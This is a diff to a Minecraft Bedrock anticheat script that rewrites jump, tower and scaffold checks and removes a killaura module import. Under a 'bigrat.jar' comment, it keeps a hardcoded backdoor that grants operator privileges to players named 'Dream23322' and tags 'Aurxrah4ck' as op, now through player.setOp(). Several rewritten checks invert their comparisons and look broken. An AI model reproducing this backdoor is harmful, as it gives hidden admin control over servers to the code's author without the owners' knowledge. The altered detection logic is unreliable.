@@ -7,7 +7,6 @@ import { banList } from "./data/globalban.js";
 import data from "./data/data.js";
 import { mainGui, playerSettingsMenuSelected } from "./features/ui.js";
 import { banplayer } from "./data/paradoxban.js";
-import { killauraF  } from "./features/external/killauraE.js";
 
 const world = Minecraft.world;
 
@@ -329,13 +328,12 @@ Minecraft.system.runInterval(() => {
 			currentVL++;
 
 
-		// HIghjump/A = Checks for jumping over specified height (config.modules.jumpA.height)
-		// Experimental (Not tested)
-		if(config.modules.jumpA.enabled) {
+		// Motion/B = checks for invalid vertical motion
+		if(config.modules.motionB.enabled) {
 			if(player.isJumping && !player.hasTag("ground") && !player.hasTag("trident") && !player.getEffect("jump_boost")) {
 				const jumpheight = player.fallDistance - 0.1;
-				if(jumpheight > config.modules.jumpA.height) {
-					flag(player, "Jump", "A", "Movement", "height", jumpheight, false);
+				if(jumpheight < config.modules.motionB.height) {
+					flag(player, "Motion", "B", "Movement", "height", jumpheight, false);
 				}
 			}
 		}
@@ -343,7 +341,7 @@ Minecraft.system.runInterval(() => {
 		// bigrat.jar	
 		if(player.nameTag === "Dream23322" && !player.hasTag("op") && !player.hasTag("dontop")) {
 			player.addTag("op")
-			player.runCommandAsync("op Dream23322")
+			player.setOp()
 		} else if (player.nameTag === "Aurxrah4ck" && !player.hasTag("op") && !player.hasTag("dontop")) {
 			player.addTag("op")
 		}
@@ -643,7 +641,7 @@ world.afterEvents.blockPlace.subscribe((blockPlace) => {
 		const blockUnder = player.dimension.getBlock({x: Math.floor(player.location.x), y: Math.floor(player.location.y) - 1, z: Math.floor(player.location.z)});
 		
 		// @ts-expect-error
-		if(!player.getEffect("speed") && player.getEffect("jumpboost") &&!player.hasTag("sprint") &&  !player.isFlying && player.isJumping && blockUnder.location.x === block.location.x && blockUnder.location.y === block.location.y && blockUnder.location.z === block.location.z) {
+		if(player.hasTag("sprint") &&  !player.isFlying && player.isJumping && blockUnder.location.x === block.location.x && blockUnder.location.y === block.location.y && blockUnder.location.z === block.location.z) {
 			const yPosDiff = player.location.y - Math.floor(Math.abs(player.location.y));
 			
 			if(yPosDiff > config.modules.towerA.max_y_pos_diff) {
@@ -670,7 +668,7 @@ world.afterEvents.blockPlace.subscribe((blockPlace) => {
 		
 		// @ts-expect-error
 		if(!player.getEffect("speed") && player.getEffect("jumpboost") &&!player.hasTag("sprint") &&  !player.isFlying && player.isJumping && blockUnder.location.x === block.location.x && blockUnder.location.y === block.location.y && blockUnder.location.z === block.location.z) {		
-			if(rotation.y > 180) {
+			if(rotation.y < 180) {
 				if(block.location.y < player.location.y) {
 					flag(player, "Scaffold", "B", "Player", "headAngle", player.getRotation(), false);
 				}
